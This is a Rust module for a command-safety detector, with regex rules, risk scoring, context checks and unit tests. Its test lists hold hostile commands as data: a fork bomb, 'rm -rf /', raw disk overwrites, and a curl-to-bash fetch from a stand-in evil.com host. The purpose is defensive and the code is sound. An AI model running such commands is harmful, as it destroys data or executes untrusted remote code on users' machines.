//! Advanced dangerous pattern detection module
//!
//! Provides comprehensive pattern-based detection of dangerous commands
//! with context-aware analysis and performance optimization.

use crate::models::{RiskLevel, SafetyAssessment};
use anyhow::Result;
use percent_encoding::percent_decode_str;
use regex::Regex;
use std::collections::HashSet;
use tracing::debug;

/// Advanced dangerous pattern detector
#[derive(Debug, Clone)]
pub struct DangerousPatternDetector {
    /// Compiled dangerous patterns
    patterns: CompiledPatterns,

    /// Context-aware rules
    context_rules: ContextRules,

    /// Performance metrics
    metrics: DetectorMetrics,

    /// Configuration
    config: DetectorConfig,
}

impl DangerousPatternDetector {
    /// Create new detector with default patterns
    pub fn new() -> Self {
        Self {
            patterns: CompiledPatterns::default(),
            context_rules: ContextRules::default(),
            metrics: DetectorMetrics::new(),
            config: DetectorConfig::default(),
        }
    }

    /// Create production detector with comprehensive patterns
    pub fn production() -> Self {
        Self {
            patterns: CompiledPatterns::production(),
            context_rules: ContextRules::production(),
            metrics: DetectorMetrics::new(),
            config: DetectorConfig::production(),
        }
    }

    /// Detect dangerous patterns in command
    pub fn detect(&mut self, command: &str) -> Result<DetectionResult> {
        let start = std::time::Instant::now();

        // Normalize command for analysis
        let normalized = self.normalize_command(command);

        // Check critical patterns first (early exit)
        if let Some(critical) = self.check_critical_patterns(&normalized)? {
            self.metrics.record_detection(start.elapsed(), true);
            return Ok(critical);
        }

        // Check standard dangerous patterns
        let mut detected_patterns = Vec::new();
        let mut highest_risk = RiskLevel::Low;

        for (pattern, info) in &self.patterns.dangerous {
            if pattern.is_match(&normalized) {
                detected_patterns.push(info.clone());
                if info.risk_level > highest_risk {
                    highest_risk = info.risk_level;
                }

                // Early exit for critical risks
                if highest_risk == RiskLevel::Critical && self.config.early_exit_on_critical {
                    break;
                }
            }
        }

        // Apply context-aware analysis
        let context_risk = self.analyze_context(&normalized, &detected_patterns)?;
        if context_risk > highest_risk {
            highest_risk = context_risk;
        }

        // Check for pattern combinations that escalate risk
        let combination_risk = self.check_pattern_combinations(&detected_patterns);
        if combination_risk > highest_risk {
            highest_risk = combination_risk;
        }

        // Build detection result
        let suggestions = self.generate_suggestions(&detected_patterns);
        let confidence = self.calculate_confidence(&detected_patterns);

        let result = DetectionResult {
            is_dangerous: !detected_patterns.is_empty(),
            risk_level: highest_risk,
            detected_patterns,
            command: command.to_string(),
            normalized_command: normalized,
            suggestions,
            confidence,
        };

        self.metrics
            .record_detection(start.elapsed(), result.is_dangerous);

        debug!(
            "Pattern detection completed: dangerous={}, risk={:?}, patterns={}, time={:?}",
            result.is_dangerous,
            result.risk_level,
            result.detected_patterns.len(),
            start.elapsed()
        );

        Ok(result)
    }

    /// Check critical patterns that require immediate blocking
    fn check_critical_patterns(&self, command: &str) -> Result<Option<DetectionResult>> {
        // Fork bomb patterns
        if self.patterns.fork_bomb.is_match(command) {
            return Ok(Some(DetectionResult {
                is_dangerous: true,
                risk_level: RiskLevel::Critical,
                detected_patterns: vec![PatternInfo {
                    name: "Fork Bomb".to_string(),
                    description: "Fork bomb that will crash the system".to_string(),
                    risk_level: RiskLevel::Critical,
                    category: PatternCategory::SystemCrash,
                }],
                command: command.to_string(),
                normalized_command: command.to_string(),
                suggestions: vec![
                    "This command is a fork bomb and will crash your system. Do not run it."
                        .to_string(),
                ],
                confidence: 1.0,
            }));
        }

        // System destruction patterns
        if self.patterns.system_destruction.is_match(command) {
            return Ok(Some(DetectionResult {
                is_dangerous: true,
                risk_level: RiskLevel::Critical,
                detected_patterns: vec![PatternInfo {
                    name: "System Destruction".to_string(),
                    description: "Command that will destroy the system".to_string(),
                    risk_level: RiskLevel::Critical,
                    category: PatternCategory::SystemDestruction,
                }],
                command: command.to_string(),
                normalized_command: command.to_string(),
                suggestions: vec![
                    "This command will destroy critical system files. Do not run it.".to_string(),
                ],
                confidence: 1.0,
            }));
        }

        Ok(None)
    }

    /// Normalize command for pattern matching
    fn normalize_command(&self, command: &str) -> String {
        let mut normalized = command.to_lowercase();

        // Expand common aliases
        normalized = normalized.replace("~", "$HOME");

        // Remove excessive whitespace
        normalized = normalized.split_whitespace().collect::<Vec<_>>().join(" ");

        // Decode common encodings
        if normalized.contains("\\x") || normalized.contains("%") {
            normalized = self.decode_escaped_strings(&normalized);
        }

        normalized
    }

    /// Decode escaped strings (hex, url encoding, etc.)
    fn decode_escaped_strings(&self, input: &str) -> String {
        let mut decoded = input.to_string();

        // Decode hex escapes (\x41 -> A)
        let hex_re = Regex::new(r"\\x([0-9a-fA-F]{2})").unwrap();
        decoded = hex_re
            .replace_all(&decoded, |caps: &regex::Captures| {
                let hex = &caps[1];
                if let Ok(byte) = u8::from_str_radix(hex, 16) {
                    (byte as char).to_string()
                } else {
                    caps[0].to_string()
                }
            })
            .to_string();

        // Decode URL encoding (%41 -> A)
        decoded = percent_decode_str(&decoded)
            .decode_utf8_lossy()
            .into_owned();

        decoded
    }

    /// Analyze command context for additional risk factors
    fn analyze_context(&self, command: &str, patterns: &[PatternInfo]) -> Result<RiskLevel> {
        let mut risk = RiskLevel::Low;

        // Check for sudo/privilege escalation
        if command.contains("sudo") || command.contains("su ") {
            risk = risk.max(RiskLevel::High);
        }

        // Check for redirection to sensitive files
        if (command.contains(">") || command.contains(">>"))
            && (command.contains("/etc/")
                || command.contains("/sys/")
                || command.contains("/boot/"))
        {
            risk = risk.max(RiskLevel::High);
        }

        // Check for background execution with dangerous commands
        if command.ends_with("&") && !patterns.is_empty() {
            risk = risk.max(RiskLevel::High);
        }

        // Check for command chaining with dangerous patterns
        if (command.contains("&&") || command.contains(";") || command.contains("|"))
            && !patterns.is_empty()
        {
            risk = risk.max(RiskLevel::Medium);
        }

        Ok(risk)
    }

    /// Check for dangerous pattern combinations
    fn check_pattern_combinations(&self, patterns: &[PatternInfo]) -> RiskLevel {
        if patterns.is_empty() {
            return RiskLevel::Low;
        }

        let categories: HashSet<_> = patterns.iter().map(|p| &p.category).collect();

        // Multiple critical categories = Critical risk
        if categories.len() > 1 && patterns.iter().any(|p| p.risk_level == RiskLevel::Critical) {
            return RiskLevel::Critical;
        }

        // File deletion + system paths = High risk
        if categories.contains(&PatternCategory::FileDestruction)
            && categories.contains(&PatternCategory::SystemModification)
        {
            return RiskLevel::High;
        }

        // Multiple high-risk patterns = High risk
        let high_risk_count = patterns
            .iter()
            .filter(|p| p.risk_level >= RiskLevel::High)
            .count();
        if high_risk_count >= 2 {
            return RiskLevel::High;
        }

        patterns
            .iter()
            .map(|p| p.risk_level)
            .max()
            .unwrap_or(RiskLevel::Low)
    }

    /// Generate suggestions for safer alternatives
    fn generate_suggestions(&self, patterns: &[PatternInfo]) -> Vec<String> {
        let mut suggestions = Vec::new();

        for pattern in patterns {
            match pattern.category {
                PatternCategory::FileDestruction => {
                    suggestions.push("Consider using 'trash' or 'mv' to move files to a temporary location instead of permanent deletion".to_string());
                    suggestions
                        .push("Add '--interactive' flag to confirm each deletion".to_string());
                }
                PatternCategory::SystemModification => {
                    suggestions.push("Create a backup before modifying system files".to_string());
                    suggestions.push("Test changes in a virtual environment first".to_string());
                }
                PatternCategory::NetworkDanger => {
                    suggestions.push("Verify the target host/IP address is correct".to_string());
                    suggestions
                        .push("Consider using rate limiting or connection limits".to_string());
                }
                PatternCategory::DataLoss => {
                    suggestions.push("Create a backup before proceeding".to_string());
                    suggestions
                        .push("Use '--dry-run' flag if available to preview changes".to_string());
                }
                _ => {}
            }
        }

        suggestions.dedup();
        suggestions
    }

    /// Calculate detection confidence score
    fn calculate_confidence(&self, patterns: &[PatternInfo]) -> f64 {
        if patterns.is_empty() {
            return 0.0;
        }

        // Higher confidence for more patterns and higher risk levels
        let base_confidence = 0.5;
        let pattern_bonus = (patterns.len() as f64 * 0.1).min(0.3);
        let risk_bonus = patterns
            .iter()
            .map(|p| match p.risk_level {
                RiskLevel::Critical => 0.2,
                RiskLevel::High => 0.15,
                RiskLevel::Medium => 0.1,
                RiskLevel::Moderate => 0.08,
                RiskLevel::Safe => 0.03,
                RiskLevel::Low => 0.05,
            })
            .sum::<f64>()
            .min(0.2);

        (base_confidence + pattern_bonus + risk_bonus).min(1.0)
    }

    /// Add custom pattern
    pub fn add_custom_pattern(&mut self, pattern: &str, info: PatternInfo) -> Result<()> {
        let regex = Regex::new(pattern)?;
        self.patterns.dangerous.push((regex, info));
        Ok(())
    }

    /// Get detection metrics
    pub fn metrics(&self) -> &DetectorMetrics {
        &self.metrics
    }
}

impl Default for DangerousPatternDetector {
    fn default() -> Self {
        Self::new()
    }
}

/// Compiled pattern sets for efficient matching
#[derive(Debug, Clone)]
pub struct CompiledPatterns {
    /// General dangerous command patterns
    pub dangerous: Vec<(Regex, PatternInfo)>,

    /// Fork bomb patterns (separate for fast checking)
    pub fork_bomb: Regex,

    /// System destruction patterns
    pub system_destruction: Regex,

    /// Safe command patterns (allowlist)
    pub safe: Vec<Regex>,
}

impl CompiledPatterns {
    /// Production pattern set
    pub fn production() -> Self {
        let mut dangerous = Vec::new();

        // File destruction patterns
        dangerous.push((
            Regex::new(r"rm\s+(-rf?|--recursive)\s+/").unwrap(),
            PatternInfo::new(
                "Recursive root deletion",
                "Attempts to delete from root",
                RiskLevel::Critical,
                PatternCategory::FileDestruction,
            ),
        ));

        dangerous.push((
            Regex::new(r"rm\s+(-rf?|--recursive)\s+(\$HOME|~)/?$").unwrap(),
            PatternInfo::new(
                "Home directory deletion",
                "Attempts to delete entire home directory",
                RiskLevel::Critical,
                PatternCategory::FileDestruction,
            ),
        ));

        dangerous.push((
            Regex::new(r"find\s+.*-delete").unwrap(),
            PatternInfo::new(
                "Find with delete",
                "Find command with deletion",
                RiskLevel::Medium,
                PatternCategory::FileDestruction,
            ),
        ));

        // System modification patterns
        dangerous.push((
            Regex::new(r"chmod\s+(777|-R\s+777)").unwrap(),
            PatternInfo::new(
                "Dangerous permissions",
                "Setting world-writable permissions",
                RiskLevel::High,
                PatternCategory::SystemModification,
            ),
        ));

        dangerous.push((
            Regex::new(r"chown\s+-R\s+(root|0):").unwrap(),
            PatternInfo::new(
                "Recursive root ownership",
                "Changing ownership to root recursively",
                RiskLevel::High,
                PatternCategory::SystemModification,
            ),
        ));

        // Disk operations
        dangerous.push((
            Regex::new(r"dd\s+.*of=/dev/(sd|hd|nvme)").unwrap(),
            PatternInfo::new(
                "Direct disk write",
                "Writing directly to disk device",
                RiskLevel::Critical,
                PatternCategory::DiskOperation,
            ),
        ));

        dangerous.push((
            Regex::new(r"mkfs\.").unwrap(),
            PatternInfo::new(
                "Filesystem creation",
                "Creating new filesystem (will destroy data)",
                RiskLevel::Critical,
                PatternCategory::DiskOperation,
            ),
        ));

        // Network dangers
        dangerous.push((
            Regex::new(r"curl.*\|\s*(bash|sh)").unwrap(),
            PatternInfo::new(
                "Curl pipe to shell",
                "Downloading and executing remote script",
                RiskLevel::High,
                PatternCategory::NetworkDanger,
            ),
        ));

        dangerous.push((
            Regex::new(r"wget.*\|\s*(bash|sh)").unwrap(),
            PatternInfo::new(
                "Wget pipe to shell",
                "Downloading and executing remote script",
                RiskLevel::High,
                PatternCategory::NetworkDanger,
            ),
        ));

        // Process operations
        dangerous.push((
            Regex::new(r"kill(all)?\s+-9").unwrap(),
            PatternInfo::new(
                "Force kill",
                "Force killing processes",
                RiskLevel::Medium,
                PatternCategory::ProcessControl,
            ),
        ));

        dangerous.push((
            Regex::new(r"pkill\s+-9").unwrap(),
            PatternInfo::new(
                "Pattern kill",
                "Force killing processes by pattern",
                RiskLevel::Medium,
                PatternCategory::ProcessControl,
            ),
        ));

        Self {
            dangerous,
            fork_bomb: Regex::new(r":\(\)\s*\{\s*:\|:&\s*\};?:?").unwrap(),
            system_destruction: Regex::new(r"rm\s+(-rf?|--recursive)\s+/(\s|$)").unwrap(),
            safe: vec![
                Regex::new(r"^ls(\s|$)").unwrap(),
                Regex::new(r"^pwd(\s|$)").unwrap(),
                Regex::new(r"^echo\s").unwrap(),
                Regex::new(r"^cat\s").unwrap(),
                Regex::new(r"^grep\s").unwrap(),
            ],
        }
    }
}

impl Default for CompiledPatterns {
    fn default() -> Self {
        Self {
            dangerous: Vec::new(),
            fork_bomb: Regex::new(r":\(\)\s*\{\s*:\|:&\s*\};?:?").unwrap(),
            system_destruction: Regex::new(r"rm\s+(-rf?|--recursive)\s+/(\s|$)").unwrap(),
            safe: Vec::new(),
        }
    }
}

/// Pattern information
#[derive(Debug, Clone)]
pub struct PatternInfo {
    /// Pattern name
    pub name: String,

    /// Pattern description
    pub description: String,

    /// Risk level
    pub risk_level: RiskLevel,

    /// Pattern category
    pub category: PatternCategory,
}

impl PatternInfo {
    pub fn new(
        name: &str,
        description: &str,
        risk_level: RiskLevel,
        category: PatternCategory,
    ) -> Self {
        Self {
            name: name.to_string(),
            description: description.to_string(),
            risk_level,
            category,
        }
    }
}

/// Pattern categories
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum PatternCategory {
    FileDestruction,
    SystemModification,
    SystemDestruction,
    SystemCrash,
    DiskOperation,
    NetworkDanger,
    ProcessControl,
    DataLoss,
    PrivilegeEscalation,
    Other,
}

/// Context-aware detection rules
#[derive(Debug, Clone)]
pub struct ContextRules {
    /// Working directory risks
    pub risky_directories: HashSet<String>,

    /// Sensitive file patterns
    pub sensitive_files: Vec<Regex>,

    /// Command combination risks
    pub risky_combinations: Vec<(Regex, Regex, RiskLevel)>,
}

impl Default for ContextRules {
    fn default() -> Self {
        Self {
            risky_directories: HashSet::from([
                "/".to_string(),
                "/etc".to_string(),
                "/sys".to_string(),
                "/boot".to_string(),
                "/usr".to_string(),
                "/bin".to_string(),
                "/sbin".to_string(),
                "/lib".to_string(),
                "/lib64".to_string(),
            ]),
            sensitive_files: vec![
                Regex::new(r"/etc/passwd").unwrap(),
                Regex::new(r"/etc/shadow").unwrap(),
                Regex::new(r"/etc/sudoers").unwrap(),
                Regex::new(r"\.ssh/").unwrap(),
                Regex::new(r"\.gnupg/").unwrap(),
            ],
            risky_combinations: Vec::new(),
        }
    }
}

impl ContextRules {
    pub fn production() -> Self {
        let mut rules = Self::default();

        // Add production combination rules
        rules.risky_combinations.push((
            Regex::new(r"sudo").unwrap(),
            Regex::new(r"rm\s+-rf?").unwrap(),
            RiskLevel::Critical,
        ));

        rules.risky_combinations.push((
            Regex::new(r"find").unwrap(),
            Regex::new(r"-exec\s+rm").unwrap(),
            RiskLevel::High,
        ));

        rules
    }
}

/// Detection result
#[derive(Debug, Clone)]
pub struct DetectionResult {
    /// Whether dangerous patterns were detected
    pub is_dangerous: bool,

    /// Highest risk level detected
    pub risk_level: RiskLevel,

    /// List of detected patterns
    pub detected_patterns: Vec<PatternInfo>,

    /// Original command
    pub command: String,

    /// Normalized command
    pub normalized_command: String,

    /// Suggestions for safer alternatives
    pub suggestions: Vec<String>,

    /// Confidence score (0.0 - 1.0)
    pub confidence: f64,
}

impl DetectionResult {
    /// Convert to safety assessment
    pub fn to_safety_assessment(&self) -> SafetyAssessment {
        SafetyAssessment {
            risk_level: self.risk_level,
            requires_confirmation: self.risk_level >= RiskLevel::Medium,
            detected_patterns: self
                .detected_patterns
                .iter()
                .map(|p| format!("{}: {}", p.name, p.description))
                .collect(),
            safety_message: if self.is_dangerous {
                Some(format!(
                    "Detected {} potentially dangerous pattern(s)",
                    self.detected_patterns.len()
                ))
            } else {
                None
            },
        }
    }
}

/// Detector configuration
#[derive(Debug, Clone)]
pub struct DetectorConfig {
    /// Early exit on critical patterns
    pub early_exit_on_critical: bool,

    /// Maximum patterns to check
    pub max_patterns_to_check: usize,

    /// Enable context analysis
    pub enable_context_analysis: bool,

    /// Enable pattern combination checking
    pub enable_combination_checking: bool,
}

impl Default for DetectorConfig {
    fn default() -> Self {
        Self {
            early_exit_on_critical: true,
            max_patterns_to_check: 100,
            enable_context_analysis: true,
            enable_combination_checking: true,
        }
    }
}

impl DetectorConfig {
    pub fn production() -> Self {
        Self {
            early_exit_on_critical: true,
            max_patterns_to_check: 200,
            enable_context_analysis: true,
            enable_combination_checking: true,
        }
    }
}

/// Detector performance metrics
#[derive(Debug, Clone)]
pub struct DetectorMetrics {
    /// Total detections performed
    pub total_detections: usize,

    /// Dangerous commands detected
    pub dangerous_detected: usize,

    /// Average detection time
    pub avg_detection_time: std::time::Duration,

    /// Fastest detection
    pub min_detection_time: std::time::Duration,

    /// Slowest detection
    pub max_detection_time: std::time::Duration,
}

impl DetectorMetrics {
    pub fn new() -> Self {
        Self {
            total_detections: 0,
            dangerous_detected: 0,
            avg_detection_time: std::time::Duration::ZERO,
            min_detection_time: std::time::Duration::MAX,
            max_detection_time: std::time::Duration::ZERO,
        }
    }

    pub fn record_detection(&mut self, duration: std::time::Duration, is_dangerous: bool) {
        self.total_detections += 1;

        if is_dangerous {
            self.dangerous_detected += 1;
        }

        // Update timing metrics
        let previous_count = self.total_detections.saturating_sub(1) as u32;
        let total_time = self.avg_detection_time * previous_count;
        self.avg_detection_time = (total_time + duration) / (self.total_detections as u32);

        if duration < self.min_detection_time {
            self.min_detection_time = duration;
        }

        if duration > self.max_detection_time {
            self.max_detection_time = duration;
        }
    }

    pub fn detection_rate(&self) -> f64 {
        if self.total_detections == 0 {
            return 0.0;
        }

        (self.dangerous_detected as f64) / (self.total_detections as f64)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_critical_pattern_detection() {
        let mut detector = DangerousPatternDetector::new();

        // Test fork bomb detection
        let result = detector.detect(":(){ :|:& };:").unwrap();
        assert!(result.is_dangerous);
        assert_eq!(result.risk_level, RiskLevel::Critical);

        // Test system destruction
        let result = detector.detect("rm -rf /").unwrap();
        assert!(result.is_dangerous);
        assert_eq!(result.risk_level, RiskLevel::Critical);
    }

    #[test]
    fn test_production_patterns() {
        let mut detector = DangerousPatternDetector::production();

        // Test various dangerous patterns
        let dangerous_commands = vec![
            "sudo rm -rf /home",
            "chmod 777 /etc/passwd",
            "curl http://evil.com/script.sh | bash",
            "dd if=/dev/zero of=/dev/sda",
            "mkfs.ext4 /dev/sda1",
        ];

        for cmd in dangerous_commands {
            let result = detector.detect(cmd).unwrap();
            assert!(result.is_dangerous, "Failed to detect: {}", cmd);
            assert!(result.risk_level >= RiskLevel::Medium);
        }
    }

    #[test]
    fn test_safe_commands() {
        let mut detector = DangerousPatternDetector::production();

        let safe_commands = vec![
            "ls -la",
            "pwd",
            "echo 'Hello World'",
            "cat file.txt",
            "grep pattern file.txt",
        ];

        for cmd in safe_commands {
            let result = detector.detect(cmd).unwrap();
            // These should be safe or low risk
            assert!(
                result.risk_level <= RiskLevel::Low,
                "Incorrectly flagged: {}",
                cmd
            );
        }
    }

    #[test]
    fn test_command_normalization() {
        let detector = DangerousPatternDetector::new();

        // Test tilde expansion
        let normalized = detector.normalize_command("rm -rf ~/Documents");
        assert!(normalized.contains("$HOME"));

        // Test whitespace normalization
        let normalized = detector.normalize_command("rm    -rf    /tmp");
        assert_eq!(normalized, "rm -rf /tmp");
    }

    #[test]
    fn test_escaped_string_decoding() {
        let detector = DangerousPatternDetector::new();

        // Test hex decoding
        let decoded = detector.decode_escaped_strings("\\x72\\x6d");
        assert!(decoded.contains("rm"));

        // Test URL decoding
        let decoded = detector.decode_escaped_strings("rm%20-rf");
        assert_eq!(decoded, "rm -rf");
    }

    #[test]
    fn test_metrics_recording() {
        let mut metrics = DetectorMetrics::new();

        metrics.record_detection(std::time::Duration::from_millis(10), false);
        metrics.record_detection(std::time::Duration::from_millis(20), true);
        metrics.record_detection(std::time::Duration::from_millis(15), true);

        assert_eq!(metrics.total_detections, 3);
        assert_eq!(metrics.dangerous_detected, 2);
        assert_eq!(
            metrics.avg_detection_time,
            std::time::Duration::from_millis(15)
        );
        assert_eq!(metrics.detection_rate(), 2.0 / 3.0);
    }
}
